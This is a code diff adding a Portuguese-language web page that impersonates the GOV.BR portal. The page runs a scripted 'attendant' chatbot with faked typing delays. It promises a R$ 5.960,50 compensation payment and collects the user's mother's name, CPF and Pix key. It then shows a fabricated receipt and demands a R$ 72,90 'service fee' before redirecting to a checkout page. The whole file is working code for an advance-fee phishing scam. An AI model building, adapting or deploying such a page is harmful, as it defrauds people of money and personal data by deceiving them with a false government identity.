@@ -1,0 +1,774 @@
+<!DOCTYPE html><html lang="pt"><head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>GOV.BR - Verificação</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: "Roboto", sans-serif;
+      background: linear-gradient(180deg, #eef3fb 0%, #e8eef8 100%);
+      /* Permite rolagem vertical se necessário, evitando rolagem horizontal */
+      overflow-x: hidden;
+    }
+    header {
+      width: 100%;
+      height: 60px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background-color: #ffffff;
+      padding: 0 20px;
+      border-bottom: 2px solid #0C326F;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 10;
+    }
+    .logo img {
+      height: 40px;
+    }
+    .barra {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+    }
+    .barra p {
+      font-size: 14px;
+      color: #333;
+      font-weight: 500;
+      cursor: pointer;
+    }
+    .usuario-area {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background-color: #0C326F;
+      padding: 8px 16px;
+      border-radius: 20px;
+      color: white;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    .usuario-area:hover {
+      background-color: #1a4a8e;
+    }
+    .headMensagem {
+      width: 100%;
+      background: #0C326F;
+      color: #fff;
+      padding: 10px 20px;
+      text-align: center;
+      font-size: 14px;
+      font-weight: 500;
+      position: fixed;
+      top: 60px;
+      left: 0;
+      z-index: 9;
+    }
+    .typebot-atendimento {
+      position: absolute;
+      top: 100px; /* Abaixo do header e da barra */
+      width: 100%;
+      height: calc(100vh - 100px);
+      padding: 10px;
+    }
+
+    .chat-shell {
+      width: 100%;
+      height: 100%;
+      max-width: 560px;
+      margin: 0 auto;
+      background: #f4f7fb;
+      border-radius: 16px;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      border: 1px solid #d9e1ec;
+      box-shadow: 0 14px 36px rgba(12, 50, 111, 0.14);
+    }
+
+    .chat-log {
+      flex: 1;
+      overflow-y: auto;
+      padding: 14px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      scroll-behavior: smooth;
+    }
+
+    .msg-row {
+      display: flex;
+      gap: 8px;
+      align-items: flex-end;
+    }
+
+    .msg-row.bot {
+      justify-content: flex-start;
+    }
+
+    .msg-row.user {
+      justify-content: flex-end;
+    }
+
+    .avatar {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      flex-shrink: 0;
+      object-fit: cover;
+    }
+
+    .bubble {
+      max-width: 92%;
+      border-radius: 14px;
+      padding: 11px 13px;
+      font-size: 14px;
+      line-height: 1.45;
+      word-break: break-word;
+      box-shadow: 0 6px 16px rgba(16, 24, 40, 0.06);
+      animation: fadeUp 180ms ease-out;
+    }
+
+    .bubble.bot {
+      background: #eff4fb;
+      color: #1f2937;
+      border: 1px solid #d8e3f2;
+    }
+
+    .bubble.user {
+      background: linear-gradient(180deg, #1b66ff 0%, #0e56ee 100%);
+      color: #fff;
+    }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(4px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .typing {
+      width: 52px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .typing span {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: #4b5563;
+      animation: blink 1s infinite alternate;
+    }
+
+    .typing span:nth-child(2) { animation-delay: 0.2s; }
+    .typing span:nth-child(3) { animation-delay: 0.4s; }
+
+    @keyframes blink {
+      from { transform: translateY(0); opacity: 0.4; }
+      to { transform: translateY(-3px); opacity: 1; }
+    }
+
+    .options-wrap {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 10px;
+      width: 100%;
+      max-width: 390px;
+      margin-left: auto;
+      animation: fadeUp 220ms ease-out;
+    }
+
+    .option-btn {
+      border: none;
+      border-radius: 10px;
+      padding: 12px 10px;
+      background: #38a745;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: 0.2s ease;
+      box-shadow: 0 6px 12px rgba(56, 167, 69, 0.2);
+    }
+
+    .option-btn:hover {
+      filter: brightness(0.95);
+      transform: translateY(-1px);
+    }
+
+    .option-btn.blue {
+      background: linear-gradient(180deg, #1b66ff 0%, #0e56ee 100%);
+      box-shadow: 0 6px 12px rgba(27, 102, 255, 0.24);
+    }
+
+    .option-btn:disabled {
+      opacity: 0.65;
+      filter: grayscale(0.12);
+      cursor: default;
+      transform: none;
+    }
+
+    .media-wrap {
+      width: 100%;
+      max-width: 430px;
+      border-radius: 12px;
+      overflow: hidden;
+      border: 1px solid #d7e0ed;
+      background: #fff;
+      padding: 8px;
+      box-shadow: 0 10px 20px rgba(15, 23, 42, 0.06);
+      animation: fadeUp 200ms ease-out;
+    }
+
+    .media-wrap img,
+    .media-wrap iframe,
+    .media-wrap audio {
+      width: 100%;
+      display: block;
+      border: none;
+      border-radius: 8px;
+    }
+
+    .media-wrap iframe {
+      min-height: 280px;
+    }
+
+    .input-inline {
+      display: flex;
+      width: 100%;
+      max-width: 390px;
+      margin-left: auto;
+      gap: 8px;
+    }
+
+    .input-inline input {
+      flex: 1;
+      padding: 10px;
+      border-radius: 10px;
+      border: 1px solid #c6cfda;
+      font-size: 14px;
+      outline: none;
+      background: #fff;
+    }
+
+    .input-inline button {
+      background: linear-gradient(180deg, #1b66ff 0%, #0e56ee 100%);
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      padding: 10px 14px;
+      cursor: pointer;
+      font-weight: 700;
+    }
+
+    .phase-chip {
+      align-self: center;
+      font-size: 12px;
+      color: #334155;
+      background: #e8eef8;
+      border: 1px solid #d5deee;
+      border-radius: 999px;
+      padding: 5px 10px;
+      margin: 2px 0 4px;
+      letter-spacing: 0.2px;
+    }
+
+    .spacer-bottom {
+      height: 18px;
+    }
+    
+    /* Media Queries para responsividade */
+    @media (max-width: 768px) {
+      header {
+        height: 50px;
+        padding: 0 10px;
+      }
+      .logo img {
+        height: 30px;
+      }
+      .barra p {
+        font-size: 12px;
+      }
+      .usuario-area {
+        padding: 6px 12px;
+        font-size: 12px;
+      }
+      .headMensagem {
+        top: 50px;
+        font-size: 12px;
+        padding: 8px 10px;
+      }
+      .typebot-atendimento {
+        top: 90px;
+        height: calc(100vh - 90px);
+        padding: 6px;
+      }
+      .bubble {
+        font-size: 13px;
+      }
+      .option-btn {
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="logo">
+      <img src="images/Gov-br-logo-svg.png" alt="Logo Gov.br">
+    </div>
+    <div class="barra">
+      <p>PT ▼</p>
+      <div class="usuario-area">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="white" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="12" cy="8" r="4"></circle>
+          <path d="M4 20c0-4 4-6 8-6s8 2 8 6" stroke="white" stroke-width="2" fill="none"></path>
+        </svg>
+        <span id="nomeUsuario">Entrar</span>
+      </div>
+    </div>
+  </header>
+  
+  <div class="headMensagem">
+    <p>Benefício <span> > </span> Indenização <span> > </span> Atendimento</p>
+  </div>
+  
+  <div class="typebot-atendimento">
+    <div class="chat-shell">
+      <div id="chatLog" class="chat-log"></div>
+    </div>
+  </div>
+  
+  <script>
+    const CONSULTA_STORAGE_KEY = "consultaCpfData";
+    const BOT_AVATAR = "https://i.postimg.cc/ZYN7JGJR/imagem-2024-05-15-053635026.png";
+    const VALOR_INDENIZACAO = "R$ 5.960,50";
+    const VALOR_TAXA = "R$ 72,90";
+
+    // Configuracao central de ritmo "humano" do atendimento.
+    // Ajuste apenas este objeto para acelerar/desacelerar todo o fluxo.
+    const CHAT_TIMING = {
+      typingBaseMs: 520,
+      typingPerCharMs: 18,
+      typingMinMs: 700,
+      typingMaxMs: 2600,
+      typingVarianceMs: 220,
+      betweenMessagesMs: 520,
+      afterUserReplyMs: 380,
+      mediaPauseMs: {
+        image: 1450,
+        audio: 2800,
+        iframe: 1850
+      },
+      custom: {
+        introVideoLeadMs: 900,
+        afterIntroVideoMs: 15000,
+        betweenValidationImagesMs: 2000,
+        afterValidationAudioMs: 6000,
+        afterSolicitandoAprovacaoMs: 4000,
+        afterCadastroPixMsgMs: 3000,
+        afterCadastroPixAudioMs: 12000,
+        afterGerandoComprovanteMs: 3000,
+        afterComprovanteGeradoMs: 3000
+      }
+    };
+
+    const perguntasMae = [
+      "LETICIA MARIA DA CONCEICAO",
+      "MARIA APARECIDA FREITAS",
+      "ROSANGELA SILVA FERREIRA",
+      "NENHUMA DAS ALTERNATIVAS"
+    ];
+
+    const estadosCivis = ["Casado (a)", "Solteiro (a)", "Viuvo (a)", "Divorciado (a)"];
+    const tiposPix = ["CPF", "Numero de Telefone", "E-mail", "Chave Aleatoria"];
+
+    const params = new URLSearchParams(window.location.search);
+    const chatLog = document.getElementById("chatLog");
+
+    const state = {
+      nome: "",
+      mae: "",
+      cpf: "",
+      pixTipo: "",
+      pixValor: "",
+      estadoCivil: "",
+      empresaNoCelular: "",
+      sessionStep: "start"
+    };
+
+    function normalizeUpper(text) {
+      return (text || "")
+        .normalize("NFD")
+        .replace(/[\u0300-\u036f]/g, "")
+        .toUpperCase()
+        .trim();
+    }
+
+    function getConsultaData() {
+      let raw = localStorage.getItem(CONSULTA_STORAGE_KEY) || sessionStorage.getItem(CONSULTA_STORAGE_KEY);
+      if (!raw && window.name && window.name.startsWith("consultaCpfPayload:")) {
+        raw = window.name.replace("consultaCpfPayload:", "");
+      }
+
+      let parsed = {};
+      if (raw) {
+        try { parsed = JSON.parse(raw); } catch (e) {}
+      }
+
+      const cpf = (params.get("cpf") || parsed.cpf || "").replace(/\D/g, "");
+      const nome = params.get("nome") || parsed.nome || "Cliente";
+      const mae = parsed.mae || "MAE NAO INFORMADA";
+
+      return { cpf, nome, mae };
+    }
+
+    function firstName(nomeCompleto) {
+      const first = (nomeCompleto || "Cliente").trim().split(" ")[0] || "Cliente";
+      return first.charAt(0).toUpperCase() + first.slice(1).toLowerCase();
+    }
+
+    function scrollBottom() {
+      setTimeout(() => {
+        chatLog.scrollTop = chatLog.scrollHeight;
+      }, 20);
+    }
+
+    function wait(ms) {
+      return new Promise((resolve) => setTimeout(resolve, ms));
+    }
+
+    function randomBetween(min, max) {
+      return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+
+    function textOnly(input) {
+      const tmp = document.createElement("div");
+      tmp.innerHTML = input;
+      return (tmp.textContent || tmp.innerText || "").trim();
+    }
+
+    function computeTypingMs(html, customMs) {
+      if (typeof customMs === "number") return customMs;
+      const length = textOnly(html).length;
+      const base = CHAT_TIMING.typingBaseMs + (length * CHAT_TIMING.typingPerCharMs);
+      const jitter = randomBetween(-CHAT_TIMING.typingVarianceMs, CHAT_TIMING.typingVarianceMs);
+      const calculated = base + jitter;
+      return Math.max(CHAT_TIMING.typingMinMs, Math.min(CHAT_TIMING.typingMaxMs, calculated));
+    }
+
+    function rowBase(type) {
+      const row = document.createElement("div");
+      row.className = `msg-row ${type}`;
+      return row;
+    }
+
+    function appendBotText(html) {
+      const row = rowBase("bot");
+      const avatar = document.createElement("img");
+      avatar.className = "avatar";
+      avatar.src = BOT_AVATAR;
+      avatar.alt = "bot";
+
+      const bubble = document.createElement("div");
+      bubble.className = "bubble bot";
+      bubble.innerHTML = html;
+
+      row.appendChild(avatar);
+      row.appendChild(bubble);
+      chatLog.appendChild(row);
+      scrollBottom();
+    }
+
+    function appendUserText(text) {
+      const row = rowBase("user");
+      const bubble = document.createElement("div");
+      bubble.className = "bubble user";
+      bubble.textContent = text;
+      row.appendChild(bubble);
+      chatLog.appendChild(row);
+      scrollBottom();
+    }
+
+    function appendBotTyping(duration) {
+      const row = rowBase("bot");
+      const avatar = document.createElement("img");
+      avatar.className = "avatar";
+      avatar.src = BOT_AVATAR;
+      avatar.alt = "bot";
+
+      const bubble = document.createElement("div");
+      bubble.className = "bubble bot";
+      bubble.innerHTML = '<div class="typing"><span></span><span></span><span></span></div>';
+
+      row.appendChild(avatar);
+      row.appendChild(bubble);
+      chatLog.appendChild(row);
+      scrollBottom();
+
+      return new Promise((resolve) => {
+        setTimeout(() => {
+          row.remove();
+          resolve();
+        }, duration);
+      });
+    }
+
+    async function botSay(html, options = {}) {
+      const typingMs = computeTypingMs(html, options.typingMs);
+      await appendBotTyping(typingMs);
+      appendBotText(html);
+      await wait(options.afterMs ?? CHAT_TIMING.betweenMessagesMs);
+    }
+
+    function appendOptions(options, color = "green", onPick) {
+      const wrap = document.createElement("div");
+      wrap.className = "options-wrap";
+      options.forEach((opt) => {
+        const btn = document.createElement("button");
+        btn.className = `option-btn${color === "blue" ? " blue" : ""}`;
+        btn.textContent = opt;
+        btn.addEventListener("click", () => {
+          wrap.querySelectorAll("button").forEach((b) => (b.disabled = true));
+          onPick(opt);
+        });
+        wrap.appendChild(btn);
+      });
+      chatLog.appendChild(wrap);
+      scrollBottom();
+      return wrap;
+    }
+
+    async function appendMedia(kind, src, options = {}) {
+      const row = rowBase("bot");
+      const avatar = document.createElement("img");
+      avatar.className = "avatar";
+      avatar.src = BOT_AVATAR;
+      avatar.alt = "bot";
+
+      const wrap = document.createElement("div");
+      wrap.className = "media-wrap";
+
+      if (kind === "iframe") {
+        const iframe = document.createElement("iframe");
+        iframe.src = src;
+        iframe.setAttribute("allowfullscreen", "true");
+        wrap.appendChild(iframe);
+      }
+
+      if (kind === "image") {
+        const img = document.createElement("img");
+        img.src = src;
+        img.alt = "media";
+        wrap.appendChild(img);
+      }
+
+      if (kind === "audio") {
+        const audio = document.createElement("audio");
+        audio.src = src;
+        audio.controls = true;
+        wrap.appendChild(audio);
+      }
+
+      row.appendChild(avatar);
+      row.appendChild(wrap);
+      chatLog.appendChild(row);
+      scrollBottom();
+      await wait(options.afterMs ?? CHAT_TIMING.mediaPauseMs[kind] ?? CHAT_TIMING.betweenMessagesMs);
+    }
+
+    function askInlineInput(placeholder, onSubmit) {
+      const line = document.createElement("div");
+      line.className = "input-inline";
+
+      const input = document.createElement("input");
+      input.placeholder = placeholder;
+
+      const btn = document.createElement("button");
+      btn.textContent = "Enviar";
+
+      const submit = () => {
+        const value = input.value.trim();
+        if (!value) return;
+        input.disabled = true;
+        btn.disabled = true;
+        onSubmit(value);
+      };
+
+      btn.addEventListener("click", submit);
+      input.addEventListener("keydown", (e) => {
+        if (e.key === "Enter") submit();
+      });
+
+      line.appendChild(input);
+      line.appendChild(btn);
+      chatLog.appendChild(line);
+      input.focus();
+      scrollBottom();
+      return line;
+    }
+
+    function appendPhaseChip(text) {
+      const chip = document.createElement("div");
+      chip.className = "phase-chip";
+      chip.textContent = text;
+      chatLog.appendChild(chip);
+      scrollBottom();
+    }
+
+    async function startFlow() {
+      appendPhaseChip("Atendente online");
+      await botSay("Seja bem-vindo(a)! Nos proximos passos vou te auxiliar a concluir sua solicitacao.");
+      await botSay("Primeiro clique no video abaixo que eu vou te auxiliar agora mesmo.", { afterMs: CHAT_TIMING.custom.introVideoLeadMs });
+      await appendMedia("iframe", "https://scripts.converteai.net/01ab5580-7fc5-4470-87ab-5aace1f2fba2/players/69517bb0b6c0dcc4672832d4/v4/embed.html", { afterMs: CHAT_TIMING.custom.afterIntroVideoMs });
+      await botSay("Nos ultimos dias, milhares de pessoas concluiram esta etapa com sucesso.");
+      await botSay(`Responda as perguntas a seguir para aprovacao do seu recebimento de <b>${VALOR_INDENIZACAO}</b>.`);
+      await askMotherName();
+    }
+
+    async function askMotherName() {
+      await botSay("Por favor, confirme o nome de sua mae.");
+      const correta = normalizeUpper(state.mae);
+      const options = [correta, ...perguntasMae];
+      appendOptions(options, "green", async (selected) => {
+        appendUserText(selected);
+        await wait(CHAT_TIMING.afterUserReplyMs);
+        await askEmpresaNoCelular();
+      });
+    }
+
+    async function askEmpresaNoCelular() {
+      await botSay("Voce ja instalou ou acessou o app da empresa no seu celular?");
+      appendOptions(["Sim", "Nao"], "green", async (selected) => {
+        state.empresaNoCelular = selected;
+        appendUserText(selected);
+        await wait(CHAT_TIMING.afterUserReplyMs);
+        await askEstadoCivil();
+      });
+    }
+
+    async function askEstadoCivil() {
+      await botSay("Qual seu estado civil?");
+      appendOptions(estadosCivis, "green", async (selected) => {
+        state.estadoCivil = selected;
+        appendUserText(selected);
+        await wait(CHAT_TIMING.afterUserReplyMs);
+        await etapaMidiaValidacao();
+      });
+    }
+
+    async function etapaMidiaValidacao() {
+      appendPhaseChip("Validacao de dados");
+      await appendMedia("image", "https://minio-production-7432.up.railway.app/typebot/public/workspaces/cmat4b52b0000s02m2dyacqqu/typebots/jaz0he6dma4dek1g2zpaos57/blocks/k46iqhq3e2przpg382pv58n3?v=1762671533129", { afterMs: CHAT_TIMING.custom.betweenValidationImagesMs });
+      await appendMedia("image", "https://minio-production-7432.up.railway.app/typebot/public/workspaces/cmat4b52b0000s02m2dyacqqu/typebots/jaz0he6dma4dek1g2zpaos57/blocks/e9088km6u3gf5gc1vvebw61p?v=1762671540890");
+      await appendMedia("audio", "https://audio.jukehost.co.uk/auvm5pKUeDEVRwohC5zUlUKXpgAZLV9Y", { afterMs: CHAT_TIMING.custom.afterValidationAudioMs });
+      await botSay("Solicitando aprovacao da sua solicitacao. Aguarde alguns segundos...", { afterMs: CHAT_TIMING.custom.afterSolicitandoAprovacaoMs });
+      await appendMedia("image", "https://minio-production-7432.up.railway.app/typebot/public/workspaces/cmat4b52b0000s02m2dyacqqu/typebots/jaz0he6dma4dek1g2zpaos57/blocks/ubu969a80hmx3l3itlz3rlas?v=1762671551243");
+      await botSay("Prossiga inserindo sua chave Pix para concluir seu recebimento gerando seu comprovante.");
+      await botSay("Selecione a chave Pix que deseja usar:");
+      askPixType();
+    }
+
+    function askPixType() {
+      appendOptions(tiposPix, "green", async (selected) => {
+        state.pixTipo = selected;
+        appendUserText(selected);
+        await wait(CHAT_TIMING.afterUserReplyMs);
+
+        if (selected === "CPF") {
+          state.pixValor = state.cpf;
+          await confirmarPix();
+          return;
+        }
+
+        const placeholders = {
+          "Numero de Telefone": "Digite o numero de telefone com DDD",
+          "E-mail": "Digite seu e-mail Pix",
+          "Chave Aleatoria": "Digite sua chave aleatoria Pix"
+        };
+
+        askInlineInput(placeholders[selected] || "Digite sua chave Pix", async (value) => {
+          state.pixValor = value;
+          appendUserText(value);
+          await wait(CHAT_TIMING.afterUserReplyMs);
+          await confirmarPix();
+        });
+      });
+    }
+
+    async function confirmarPix() {
+      await botSay(`<b>ATENCAO:</b> Verifique se a chave Pix informada esta correta.<br><br><b>${state.pixValor}</b><br><br>A empresa nao se responsabiliza por chave Pix informada incorretamente.`);
+      appendOptions(["Sim, esta correto."], "blue", async (selected) => {
+        appendUserText(selected);
+        await wait(CHAT_TIMING.afterUserReplyMs);
+        await etapaComprovante();
+      });
+    }
+
+    async function etapaComprovante() {
+      appendPhaseChip("Cadastro da chave Pix");
+      await botSay("Aguarde alguns segundos, estamos cadastrando sua chave Pix no sistema...", { afterMs: CHAT_TIMING.custom.afterCadastroPixMsgMs });
+      await appendMedia("image", "https://minio-production-7432.up.railway.app/typebot/public/workspaces/cmat4b52b0000s02m2dyacqqu/typebots/jaz0he6dma4dek1g2zpaos57/blocks/lygixgb9pg6rp1po2f5zsmes?v=1762671562176");
+      await botSay("Sua chave Pix foi cadastrada com sucesso!");
+      await appendMedia("audio", "https://minio-production-8829.up.railway.app/typebot/public/workspaces/cma37nmaa0000cqjr0wbg8bpb/typebots/vnmk2k1demf9awax9ubw4ph3/blocks/ufkn04e8qgib70q129ucz7h8?v=1746964362275", { afterMs: CHAT_TIMING.custom.afterCadastroPixAudioMs });
+      await botSay(`Clique no botao abaixo para confirmar e liberar o envio para a chave Pix informada.<br><br>Geraremos seu comprovante de <b>${VALOR_INDENIZACAO}</b> neste instante.`);
+      appendOptions(["Confirmar e gerar comprovante de recebimento"], "blue", async (selected) => {
+        appendUserText(selected);
+        await wait(CHAT_TIMING.afterUserReplyMs);
+        await etapaComprovanteGerado();
+      });
+    }
+
+    async function etapaComprovanteGerado() {
+      appendPhaseChip("Comprovante");
+      await botSay("Gerando seu comprovante de recebimento dos valores...", { afterMs: CHAT_TIMING.custom.afterGerandoComprovanteMs });
+      await botSay("<b>Comprovante gerado</b>", { afterMs: CHAT_TIMING.custom.afterComprovanteGeradoMs });
+      const urlComprovante = `https://comprovantte.sbs/?nome=${encodeURIComponent(state.nome)}&cpf=${encodeURIComponent(state.cpf)}&valor=${encodeURIComponent(VALOR_TAXA)}`;
+      await appendMedia("iframe", urlComprovante);
+      await appendMedia("audio", "https://minio-production-7432.up.railway.app/typebot/public/workspaces/cmat4b52b0000s02m2dyacqqu/typebots/jaz0he6dma4dek1g2zpaos57/blocks/vmjypazr1e9svjag8lgqf4w3?v=1762671901465");
+      await botSay(`<b>Resumo da solicitacao</b><br><br>Valor para saque: <b>${VALOR_INDENIZACAO}</b><br>Titular: <b>${state.nome}</b><br>Chave Pix: <b>${state.pixValor}</b><br>Taxa de servico: <b>${VALOR_TAXA}</b>`);
+      appendOptions(["Por que tenho que pagar essa taxa?"], "blue", async (selected) => {
+        appendUserText(selected);
+        await wait(CHAT_TIMING.afterUserReplyMs);
+        await botSay("A taxa de servico cobre validacao operacional, emissao de comprovante e processamento da transferencia em ambiente protegido.");
+        await botSay("Apos a confirmacao da taxa, a solicitacao segue para conclusao.");
+        appendOptions(["Concluir pagamento e receber minha indenizacao"], "blue", () => {
+          const checkoutParams = new URLSearchParams();
+          checkoutParams.set("nome", state.nome);
+          checkoutParams.set("cpf", state.cpf);
+          checkoutParams.set("chave_pix", state.pixValor);
+          checkoutParams.set("valor", VALOR_INDENIZACAO);
+          checkoutParams.set("taxa", VALOR_TAXA);
+          window.location.href = `../checkout/index.html?${checkoutParams.toString()}`;
+        });
+      });
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+      const dados = getConsultaData();
+      state.nome = dados.nome;
+      state.mae = dados.mae;
+      state.cpf = dados.cpf;
+
+      document.getElementById("nomeUsuario").innerText = firstName(state.nome);
+      startFlow();
+      setTimeout(() => {
+        document.querySelector(".typebot-atendimento").scrollIntoView({ behavior: "smooth" });
+      }, 400);
+    });
+  </script>
+
+</body></html>
